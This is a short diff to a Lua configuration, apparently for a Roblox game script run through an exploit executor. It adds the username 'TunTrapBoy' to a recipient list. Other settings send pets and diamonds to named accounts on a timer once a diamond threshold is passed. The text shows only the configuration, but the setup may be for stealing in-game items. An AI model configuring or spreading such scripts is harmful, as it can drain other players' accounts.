@@ -10,7 +10,7 @@ getgenv().Config = {
         PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7 , 8, 9}, -- slot dành cho pet
         EGG_SLOTS = { 10 }, -- slot dành cho trứng
     },
-    Usernames = { '' }, -- Danh sách người nhận
+    Usernames = { 'TunTrapBoy' }, -- Danh sách người nhận
     PetSendInterval = 20, -- Thời gian quét và gửi lại (giây)
     MinDiamonds = 50000000, -- Gửi khi kim cương > số này
     Receivers = { 'DreamSoCow' }, -- Danh sách người nhận
